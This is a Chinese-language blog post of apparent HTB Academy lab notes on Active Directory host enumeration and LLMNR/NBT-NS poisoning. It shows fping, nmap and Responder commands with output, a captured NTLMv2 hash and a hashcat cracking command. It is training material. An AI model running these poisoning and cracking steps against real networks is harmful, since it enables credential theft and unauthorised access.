<!DOCTYPE HTML>
<html>
<head>
  <meta charset="utf-8">
  <meta http-equiv="pragma" content="no-cache">
  <meta http-equiv="cache-control" content="no-cache">
  <meta http-equiv="expires" content="0">
  
  <title>Active Directory Enumeration &amp; Attacks | n2ryx&#39;s Blog</title>
  <meta name="author" content="n2ryx">
  
  <meta name="description" content="Host Enumeration关键数据



Data Point
Description



AD Users
尝试枚举可以作为密码喷洒目标的有效用户帐户。


AD Joined Computers
关键计算机包括域控制器、文件服务器、SQL 服务器、Web 服务器、Exchange 邮件服务器、数据库服务器等。


Key Services
Kerberos、NetBIOS、LDAP、DNS


Vulnerable Hosts and Services
任何可以快速取胜的事情。（即容易利用并获得立足点的主机）


Passive被动收集
Wireshark

ARP 数据包让知道主机：172.16.5.5、172.16.5.25 172.16.5.50、172.16.5.100 和 172.16.5.125。



MDNS 让知道ACADEMY-EA-WEB01 主机。"> 
  
  
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">

  <meta property="og:title" content="Active Directory Enumeration &amp; Attacks"/>
  <meta property="og:site_name" content="n2ryx&#39;s Blog"/>

  
    <meta property="og:image" content=""/>
  

  
    <link rel="alternative" href="/atom.xml" title="n2ryx&#39;s Blog" type="application/atom+xml">
  
  
    <link href="/favicon.png" rel="icon">
  
  
  <link rel="stylesheet" href="/css/bootstrap.min.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/font-awesome.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/responsive.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/highlight.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/prism.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/google-fonts.css" media="screen" type="text/css">
  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->

  <script src="/js/jquery-2.0.3.min.js"></script>

  <!-- analytics -->
  
  <!-- Global site tag (gtag.js) - Google Analytics -->
<script async src="https://www.googletagmanager.com/gtag/js?id=UA-70812759-1"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'UA-70812759-1');
</script>






<meta name="generator" content="Hexo 7.3.0"></head>

 <body>  
  <nav id="main-nav" class="navbar navbar-inverse navbar-fixed-top" role="navigation">
    <div class="container">
      <button type="button" class="navbar-header navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
		<span class="sr-only">Toggle navigation</span>
        <span class="icon-bar"></span>
        <span class="icon-bar"></span>
        <span class="icon-bar"></span>
      </button>
	  <a class="navbar-brand" href="/">n2ryx&#39;s Blog</a>
      <div class="collapse navbar-collapse nav-menu">
		<ul class="nav navbar-nav">
		  
		  <li>
			<a href="/archives" title="All the articles.">
			  <i class="fa fa-archive"></i>Archives
			</a>
		  </li>
		  
		  <li>
			<a href="/categories" title="All the categories.">
			  <i class="fa fa-folder"></i>Categories
			</a>
		  </li>
		  
		  <li>
			<a href="/tags" title="All the tags.">
			  <i class="fa fa-tags"></i>Tags
			</a>
		  </li>
		  
		  <li>
			<a href="/about" title="About me.">
			  <i class="fa fa-user"></i>About
			</a>
		  </li>
		  
		  <li>
			<a href="/tool" title="All the tools.">
			  <i class="fa fa-terminal"></i>Tool
			</a>
		  </li>
		  
		</ul>
      </div>
    </div> <!-- container -->
</nav>
<div class="clearfix"></div>

  <div class="container">
  	<div class="content">
    	 


	
		<div class="page-header">
			<h1> Active Directory Enumeration &amp; Attacks</h1>
		</div>
	



<div class="row post">
	<!-- cols -->
	
	<div id="top_meta"></div>
	<div class="col-md-9">
	

	<!-- content -->
	<div class="mypage">		
	  		

	  <h1 id="Host-Enumeration"><a href="#Host-Enumeration" class="headerlink" title="Host Enumeration"></a>Host Enumeration</h1><p>关键数据</p>
<table>
<thead>
<tr>
<th align="left">Data Point</th>
<th align="left">Description</th>
</tr>
</thead>
<tbody><tr>
<td align="left"><code>AD Users</code></td>
<td align="left">尝试枚举可以作为密码喷洒目标的有效用户帐户。</td>
</tr>
<tr>
<td align="left"><code>AD Joined Computers</code></td>
<td align="left">关键计算机包括域控制器、文件服务器、SQL 服务器、Web 服务器、Exchange 邮件服务器、数据库服务器等。</td>
</tr>
<tr>
<td align="left"><code>Key Services</code></td>
<td align="left">Kerberos、NetBIOS、LDAP、DNS</td>
</tr>
<tr>
<td align="left"><code>Vulnerable Hosts and Services</code></td>
<td align="left">任何可以快速取胜的事情。（即容易利用并获得立足点的主机）</td>
</tr>
</tbody></table>
<h2 id="Passive"><a href="#Passive" class="headerlink" title="Passive"></a>Passive</h2><p>被动收集</p>
<h3 id="Wireshark"><a href="#Wireshark" class="headerlink" title="Wireshark"></a>Wireshark</h3><p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2024/image-1729257350539.png" alt="ea-wireshark"></p>
<ul>
<li>ARP 数据包让知道主机：172.16.5.5、172.16.5.25 172.16.5.50、172.16.5.100 和 172.16.5.125。</li>
</ul>
<p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2024/image-1729257350635.png" alt="ea-wireshark-mdns"></p>
<ul>
<li>MDNS 让知道ACADEMY-EA-WEB01 主机。</li>
</ul>
<h3 id="Tcpdump"><a href="#Tcpdump" class="headerlink" title="Tcpdump"></a>Tcpdump</h3><p>如果所在的主机没有 GUI（这是很常见的情况），可以使用<a target="_blank" rel="noopener" href="https://linux.die.net/man/8/tcpdump">tcpdump</a>、<a target="_blank" rel="noopener" href="https://github.com/DanMcInerney/net-creds">net-creds</a>和<a target="_blank" rel="noopener" href="https://www.netminer.com/en/product/netminer.php">NetMiner</a>等来执行相同的功能。还可以使用 tcpdump 将捕获保存到 .pcap 文件，将其传输到另一台主机，然后在 Wireshark 中打开它。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo tcpdump -i ens224 </span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2024/image-1729257357287.gif" alt="tcpdump-example"></p>
<h3 id="Responder"><a href="#Responder" class="headerlink" title="Responder"></a>Responder</h3><p><a target="_blank" rel="noopener" href="https://github.com/lgandx/Responder-Windows">Responder</a>是一款用于监听、分析和毒害<code>LLMNR</code>、<code>NBT-NS</code>、 以及<code>MDNS</code>请求和响应的工具。它还有许多其他功能，这里只利用了该工具的分析模式。这将被动地监听网络，而不会发送任何被毒害的数据包。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo responder -I ens224 -A </span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2024/image-1729257363590.gif" alt="responder-example"></p>
<h2 id="Active"><a href="#Active" class="headerlink" title="Active"></a>Active</h2><p>主动收集</p>
<h3 id="FPing"><a href="#FPing" class="headerlink" title="FPing"></a>FPing</h3><p><a target="_blank" rel="noopener" href="https://fping.org/">Fping</a>为提供了与标准 ping 应用程序类似的功能，即利用 ICMP 请求和回复来联系主机并与之交互。fping 的亮点在于它能够同时向多个主机列表发出 ICMP 数据包，并且具有脚本功能。此外，它以循环方式工作，以循环方式查询主机，而不是等待对单个主机的多个请求返回后再继续。这些检查将帮助确定内部网络上是否有其他活动。ICMP 不是一站式服务，但它是一种轻松了解存在内容的初步方法。其他开放端口和活动协议可能会指向新主机以供以后定位。让看看它的实际效果。</p>
<p>这里将从<code>fping</code>几个标志开始：<code>a</code>显示活动的目标、<code>s</code>在扫描结束时打印统计信息、<code>g</code>从 CIDR 网络生成目标列表以及<code>q</code>不显示每个目标的结果。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">$ fping -asgq 172.16.5.0/23</span><br><span class="line"></span><br><span class="line">172.16.5.5</span><br><span class="line">172.16.5.25</span><br><span class="line">172.16.5.50</span><br><span class="line">172.16.5.100</span><br><span class="line">172.16.5.125</span><br><span class="line">172.16.5.200</span><br><span class="line">172.16.5.225</span><br><span class="line">172.16.5.238</span><br><span class="line">172.16.5.240</span><br><span class="line"></span><br><span class="line">     510 targets</span><br><span class="line">       9 alive</span><br><span class="line">     501 unreachable</span><br><span class="line">       0 unknown addresses</span><br><span class="line"></span><br><span class="line">    2004 timeouts (waiting for response)</span><br><span class="line">    2013 ICMP Echos sent</span><br><span class="line">       9 ICMP Echo Replies received</span><br><span class="line">    2004 other ICMP received</span><br><span class="line"></span><br><span class="line"> 0.029 ms (min round trip time)</span><br><span class="line"> 0.396 ms (avg round trip time)</span><br><span class="line"> 0.799 ms (max round trip time)</span><br><span class="line">       15.366 sec (elapsed real time)</span><br></pre></td></tr></table></figure>

<h3 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h3><p>扫描每台主机正在运行哪些服务，识别关键主机（例如<code>Domain Controllers</code>和<code>web servers</code>），并识别可能存在漏洞的主机以便稍后进行探测。由于专注于 AD，在进行广泛扫描之后，明智的做法是专注于伴随 AD 服务的标准协议，例如 DNS、SMB、LDAP 和 Kerberos 等。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br></pre></td><td class="code"><pre><span class="line">$ nmap -A -v -iL hosts.txt -oN nmap-enum</span><br><span class="line">Nmap scan report for inlanefreight.local (172.16.5.5)</span><br><span class="line">Host is up (0.054s latency).</span><br><span class="line">Not shown: 988 closed tcp ports (conn-refused)</span><br><span class="line">PORT     STATE SERVICE       VERSION</span><br><span class="line">53/tcp   open  domain        Simple DNS Plus</span><br><span class="line">88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-10-09 07:43:13Z)</span><br><span class="line">135/tcp  open  msrpc         Microsoft Windows RPC</span><br><span class="line">139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn</span><br><span class="line">389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: INLANEFREIGHT.LOCAL0., Site: Default-First-Site-Name)</span><br><span class="line">| ssl-cert: Subject:</span><br><span class="line">| Subject Alternative Name: DNS:ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL, DNS:INLANEFREIGHT.LOCAL, DNS:INLANEFREIGHT</span><br><span class="line">| Not valid before: 2023-10-27T13:11:32</span><br><span class="line">|_Not valid after:  2024-10-26T13:11:32</span><br><span class="line">|_ssl-date: 2024-10-09T07:44:56+00:00; +10s from scanner time.</span><br><span class="line">445/tcp  open  microsoft-ds?</span><br><span class="line">464/tcp  open  kpasswd5?</span><br><span class="line">593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0</span><br><span class="line">636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: INLANEFREIGHT.LOCAL0., Site: Default-First-Site-Name)</span><br><span class="line">| ssl-cert: Subject:</span><br><span class="line">| Subject Alternative Name: DNS:ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL, DNS:INLANEFREIGHT.LOCAL, DNS:INLANEFREIGHT</span><br><span class="line">| Not valid before: 2023-10-27T13:11:32</span><br><span class="line">|_Not valid after:  2024-10-26T13:11:32</span><br><span class="line">|_ssl-date: 2024-10-09T07:44:56+00:00; +10s from scanner time.</span><br><span class="line">3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: INLANEFREIGHT.LOCAL0., Site: Default-First-Site-Name)</span><br><span class="line">| ssl-cert: Subject:</span><br><span class="line">| Subject Alternative Name: DNS:ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL, DNS:INLANEFREIGHT.LOCAL, DNS:INLANEFREIGHT</span><br><span class="line">| Not valid before: 2023-10-27T13:11:32</span><br><span class="line">|_Not valid after:  2024-10-26T13:11:32</span><br><span class="line">|_ssl-date: 2024-10-09T07:44:56+00:00; +10s from scanner time.</span><br><span class="line">3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: INLANEFREIGHT.LOCAL0., Site: Default-First-Site-Name)</span><br><span class="line">|_ssl-date: 2024-10-09T07:44:56+00:00; +10s from scanner time.</span><br><span class="line">| ssl-cert: Subject:</span><br><span class="line">| Subject Alternative Name: DNS:ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL, DNS:INLANEFREIGHT.LOCAL, DNS:INLANEFREIGHT</span><br><span class="line">| Not valid before: 2023-10-27T13:11:32</span><br><span class="line">|_Not valid after:  2024-10-26T13:11:32</span><br><span class="line">3389/tcp open  ms-wbt-server Microsoft Terminal Services</span><br><span class="line">| ssl-cert: Subject: commonName=ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL</span><br><span class="line">| Not valid before: 2024-10-08T07:35:57</span><br><span class="line">|_Not valid after:  2025-04-09T07:35:57</span><br><span class="line">| rdp-ntlm-info:</span><br><span class="line">|   Target_Name: INLANEFREIGHT</span><br><span class="line">|   NetBIOS_Domain_Name: INLANEFREIGHT</span><br><span class="line">|   NetBIOS_Computer_Name: ACADEMY-EA-DC01</span><br><span class="line">|   DNS_Domain_Name: INLANEFREIGHT.LOCAL</span><br><span class="line">|   DNS_Computer_Name: ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL</span><br><span class="line">|   Product_Version: 10.0.17763</span><br><span class="line">|_  System_Time: 2024-10-09T07:43:52+00:00</span><br><span class="line">|_ssl-date: 2024-10-09T07:44:56+00:00; +10s from scanner time.</span><br><span class="line">Service Info: Host: ACADEMY-EA-DC01; OS: Windows; CPE: cpe:/o:microsoft:windows</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">|_nbstat: NetBIOS name: ACADEMY-EA-DC01, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: 00:50:56:b0:04:b3 (VMware)</span><br><span class="line">|_clock-skew: mean: 10s, deviation: 0s, median: 9s</span><br><span class="line">| smb2-time:</span><br><span class="line">|   date: 2024-10-09T07:43:52</span><br><span class="line">|_  start_date: N/A</span><br><span class="line">| smb2-security-mode:</span><br><span class="line">|   3.1.1:</span><br><span class="line">|_    Message signing enabled and required</span><br><span class="line"></span><br><span class="line">Nmap scan report for 172.16.5.130</span><br><span class="line">Host is up (0.057s latency).</span><br><span class="line">Not shown: 992 closed tcp ports (conn-refused)</span><br><span class="line">PORT      STATE SERVICE       VERSION</span><br><span class="line">80/tcp    open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)</span><br><span class="line">135/tcp   open  msrpc         Microsoft Windows RPC</span><br><span class="line">139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn</span><br><span class="line">445/tcp   open  microsoft-ds?</span><br><span class="line">808/tcp   open  ccproxy-http?</span><br><span class="line">1433/tcp  open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM</span><br><span class="line">| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback</span><br><span class="line">| Not valid before: 2024-10-09T07:36:01</span><br><span class="line">|_Not valid after:  2054-10-09T07:36:01</span><br><span class="line">|_ssl-date: 2024-10-09T07:44:46+00:00; 0s from scanner time.</span><br><span class="line">| ms-sql-ntlm-info:</span><br><span class="line">|   Target_Name: INLANEFREIGHT</span><br><span class="line">|   NetBIOS_Domain_Name: INLANEFREIGHT</span><br><span class="line">|   NetBIOS_Computer_Name: ACADEMY-EA-FILE</span><br><span class="line">|   DNS_Domain_Name: INLANEFREIGHT.LOCAL</span><br><span class="line">|   DNS_Computer_Name: ACADEMY-EA-FILE.INLANEFREIGHT.LOCAL</span><br><span class="line">|   DNS_Tree_Name: INLANEFREIGHT.LOCAL</span><br><span class="line">|_  Product_Version: 10.0.17763</span><br><span class="line">3389/tcp  open  ms-wbt-server Microsoft Terminal Services</span><br><span class="line">| ssl-cert: Subject: commonName=ACADEMY-EA-FILE.INLANEFREIGHT.LOCAL</span><br><span class="line">| Not valid before: 2024-10-08T07:35:45</span><br><span class="line">|_Not valid after:  2025-04-09T07:35:45</span><br><span class="line">|_ssl-date: 2024-10-09T07:44:46+00:00; 0s from scanner time.</span><br><span class="line">| rdp-ntlm-info:</span><br><span class="line">|   Target_Name: INLANEFREIGHT</span><br><span class="line">|   NetBIOS_Domain_Name: INLANEFREIGHT</span><br><span class="line">|   NetBIOS_Computer_Name: ACADEMY-EA-FILE</span><br><span class="line">|   DNS_Domain_Name: INLANEFREIGHT.LOCAL</span><br><span class="line">|   DNS_Computer_Name: ACADEMY-EA-FILE.INLANEFREIGHT.LOCAL</span><br><span class="line">|   DNS_Tree_Name: INLANEFREIGHT.LOCAL</span><br><span class="line">|   Product_Version: 10.0.17763</span><br><span class="line">|_  System_Time: 2024-10-09T07:43:41+00:00</span><br><span class="line">16001/tcp open  mc-nmf        .NET Message Framing</span><br><span class="line">Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">| ms-sql-info:</span><br><span class="line">|   172.16.5.130:1433:</span><br><span class="line">|     Version:</span><br><span class="line">|       name: Microsoft SQL Server 2019 RTM</span><br><span class="line">|       number: 15.00.2000.00</span><br><span class="line">|       Product: Microsoft SQL Server 2019</span><br><span class="line">|       Service pack level: RTM</span><br><span class="line">|       Post-SP patches applied: false</span><br><span class="line">|_    TCP port: 1433</span><br><span class="line">|_nbstat: NetBIOS name: ACADEMY-EA-FILE, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: 00:50:56:b0:63:a6 (VMware)</span><br><span class="line">| smb2-time:</span><br><span class="line">|   date: 2024-10-09T07:43:42</span><br><span class="line">|_  start_date: N/A</span><br><span class="line">| smb2-security-mode:</span><br><span class="line">|   3.1.1:</span><br><span class="line">|_    Message signing enabled but not required</span><br><span class="line"></span><br><span class="line">Nmap scan report for 172.16.5.225</span><br><span class="line">Host is up (0.059s latency).</span><br><span class="line">Not shown: 998 closed tcp ports (conn-refused)</span><br><span class="line">PORT     STATE SERVICE       VERSION</span><br><span class="line">22/tcp   open  ssh           OpenSSH 8.4p1 Debian 5 (protocol 2.0)</span><br><span class="line">| ssh-hostkey:</span><br><span class="line">|   3072 97:cc:9f:d0:a3:84:da:d1:a2:01:58:a1:f2:71:37:e5 (RSA)</span><br><span class="line">|   256 03:15:a9:1c:84:26:87:b7:5f:8d:72:73:9f:96:e0:f2 (ECDSA)</span><br><span class="line">|_  256 55:c9:4a:d2:63:8b:5f:f2:ed:7b:4e:38:e1:c9:f5:71 (ED25519)</span><br><span class="line">3389/tcp open  ms-wbt-server xrdp</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br></pre></td></tr></table></figure>

<h3 id="script"><a href="#script" class="headerlink" title="script"></a>script</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># sh</span><br><span class="line">for i in &#123;1..254&#125; ;do (ping -c 1 172.16.5.$i | grep &quot;bytes from&quot; &amp;) ;done</span><br><span class="line"></span><br><span class="line"># cmd</span><br><span class="line">for /L %i in (1 1 254) do ping 172.16.5.%i -n 1 -w 100 | find &quot;Reply&quot;</span><br><span class="line"></span><br><span class="line"># powershell</span><br><span class="line">1..254 | % &#123;&quot;172.16.5.$($_): $(Test-Connection -count 1 -comp 172.15.5.$($_) -quiet)&quot;&#125;</span><br></pre></td></tr></table></figure>

<hr>
<h1 id="LLMNR-NBT-NS-Poisoning"><a href="#LLMNR-NBT-NS-Poisoning" class="headerlink" title="LLMNR&#x2F;NBT-NS Poisoning"></a>LLMNR&#x2F;NBT-NS Poisoning</h1><p><a target="_blank" rel="noopener" href="https://datatracker.ietf.org/doc/html/rfc4795">链路本地多播名称解析</a>(LLMNR) 和<a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-2000-server/cc940063(v=technet.10)?redirectedfrom=MSDN">NetBIOS 名称服务</a>(NBT-NS) 是 Microsoft Windows 组件，可在 DNS 失败时用作主机识别的替代方法。如果计算机尝试解析主机但 DNS 解析失败，通常，该计算机将尝试通过 LLMNR 向本地网络上的所有其他计算机询问正确的主机地址。LLMNR 基于域名系统 (DNS) 格式，允许同一本地链路上的主机为其他主机执行名称解析。它原生使用<code>5355</code>UDP 上的端口。如果 LLMNR 失败，则将使用 NBT-NS。NBT-NS 通过其 NetBIOS 名称识别本地网络上的系统。NBT-NS 使用<code>137</code>UDP 上的端口。</p>
<p>关键在于，当使用 LLMNR&#x2F;NBT-NS 进行名称解析时，网络上的任何主机都可以回复。这就是用来<code>Responder</code>毒害这些请求的地方。通过网络访问，可以欺骗广播域中的权威名称解析源（在本例中，是应该属于网络段的主机），通过响应 LLMNR 和 NBT-NS 流量，就好像它们对请求主机有答案一样。这种毒害行为是为了让受害者与系统通信，假装流氓系统知道所请求主机的位置。如果所请求的主机需要名称解析或身份验证操作，可以捕获 NetNTLM Hash并对其进行离线暴力攻击，以尝试检索明文密码。捕获的身份验证请求还可以中继以访问另一台主机或用于同一主机上的其他协议（如 LDAP）。LLMNR&#x2F;NBNS 欺骗与缺乏 SMB 签名相结合通常会导致对域内主机的管理访问。 </p>
<p><strong>攻击流程</strong></p>
<ol>
<li>主机尝试连接到 \print01.inlanefreight.local 的打印服务器，但意外输入了 \printer01.inlanefreight.local。</li>
<li>DNS 服务器响应，指出该主机未知。</li>
<li>然后，主机向整个本地网络广播，询问是否有人知道 \printer01.inlanefreight.local 的位置。</li>
<li>攻击者（正在<code>Responder</code>运行的）响应主机，指出主机正在寻找的是 \printer01.inlanefreight.local。</li>
<li>主机相信此答复并使用用户名和 NTLMv2 密码哈希向攻击者发送身份验证请求。</li>
<li>然后，如果条件合适，可以离线破解此哈希值，或将其用于 SMB 中继攻击。</li>
</ol>
<p><strong>TTPs</strong></p>
<p>执行这些操作是为了收集通过网络以 NTLMv1 和 NTLMv2 密码哈希形式发送的身份验证信息。。然后，将获取哈希并尝试使用<a target="_blank" rel="noopener" href="https://hashcat.net/hashcat/">Hashcat</a>或<a target="_blank" rel="noopener" href="https://www.openwall.com/john/">John</a>等工具离线破解它们，目的是获取帐户的明文密码，用于获得初始立足点或扩展在域内的访问权限。</p>
<p>有几种工具可用于尝试 LLMNR 和 NBT-NS 中毒：</p>
<table>
<thead>
<tr>
<th>工具</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td><a target="_blank" rel="noopener" href="https://github.com/lgandx/Responder">Responder</a></td>
<td>Responder 是一种专门用于毒害 LLMNR、NBT-NS 和 MDNS 的工具，具有多种不同的功能。</td>
</tr>
<tr>
<td><a target="_blank" rel="noopener" href="https://github.com/Kevin-Robertson/Inveigh">Inveigh</a></td>
<td>Inveigh 是一个跨平台 MITM 平台，可用于欺骗和毒害攻击。</td>
</tr>
<tr>
<td><a target="_blank" rel="noopener" href="https://www.metasploit.com/">Metasploit</a></td>
<td>Metasploit 有几种内置扫描器和欺骗模块，用于应对毒化攻击。</td>
</tr>
</tbody></table>
<p>Responder 和 Inveigh 都可用于攻击以下协议：</p>
<ul>
<li>LLMNR</li>
<li>DNS</li>
<li>MDNS</li>
<li>NBNS</li>
<li>DHCP</li>
<li>ICMP</li>
<li>HTTP</li>
<li>HTTPS</li>
<li>SMB</li>
<li>LDAP</li>
<li>WebDAV</li>
<li>Proxy Auth</li>
</ul>
<p>Responder 还支持:</p>
<ul>
<li>MSSQL</li>
<li>DCE-RPC</li>
<li>FTP, POP3, IMAP, and SMTP auth</li>
</ul>
<h2 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h2><h3 id="Responder-1"><a href="#Responder-1" class="headerlink" title="Responder"></a>Responder</h3><p>支持的端口</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">UDP 137, UDP 138, UDP 53, UDP/TCP 389,TCP 1433, UDP 1434, TCP 80, TCP 135, TCP 139, TCP 445, TCP 21, TCP 3141,TCP 25, TCP 110, TCP 587, TCP 3128, Multicast UDP 5355 and 5353</span><br></pre></td></tr></table></figure>

<p>运行 Responder</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">$ sudo responder -I ens224</span><br><span class="line"></span><br><span class="line">&lt;SNIP&gt;</span><br><span class="line"></span><br><span class="line">[SMB] NTLMv2-SSP Client   : 172.16.5.130</span><br><span class="line">[SMB] NTLMv2-SSP Username : INLANEFREIGHT\backupagent</span><br><span class="line">[SMB] NTLMv2-SSP Hash     : backupagent::INLANEFREIGHT:1ae5cf39915df51c:56B4DB4A04F5FD42D6EB32A731746D7C:010100000000000080C1EEB1031ADB01D00EFDEAAA2D70E500000000020008005A0052005200540001001E00570049004E002D005A003300340055004800580056004700390046004A0004003400570049004E002D005A003300340055004800580056004700390046004A002E005A005200520054002E004C004F00430041004C00030014005A005200520054002E004C004F00430041004C00050014005A005200520054002E004C004F00430041004C000700080080C1EEB1031ADB010600040002000000080030003000000000000000000000000030000093D4F972BB4A1768889451584B510B13CABEB87F10485717B8133FCE5BF3D9160A001000000000000000000000000000000000000900220063006900660073002F003100370032002E00310036002E0035002E003200320035000000000000000000</span><br><span class="line">[*] Skipping previously captured hash for INLANEFREIGHT\backupagent</span><br><span class="line">[*] Skipping previously captured hash for INLANEFREIGHT\backupagent</span><br><span class="line">[*] Skipping previously captured hash for INLANEFREIGHT\backupagent</span><br><span class="line">[*] Skipping previously captured hash for INLANEFREIGHT\backupagent</span><br><span class="line">[*] Skipping previously captured hash for INLANEFREIGHT\backupagent</span><br><span class="line">[*] Skipping previously captured hash for INLANEFREIGHT\backupagent</span><br><span class="line"></span><br><span class="line">&lt;SNIP&gt;</span><br></pre></td></tr></table></figure>

<p>破解</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat -m 5600 backupagent_hash /path/to/rockyou.txt</span><br></pre></td></tr></table></figure>

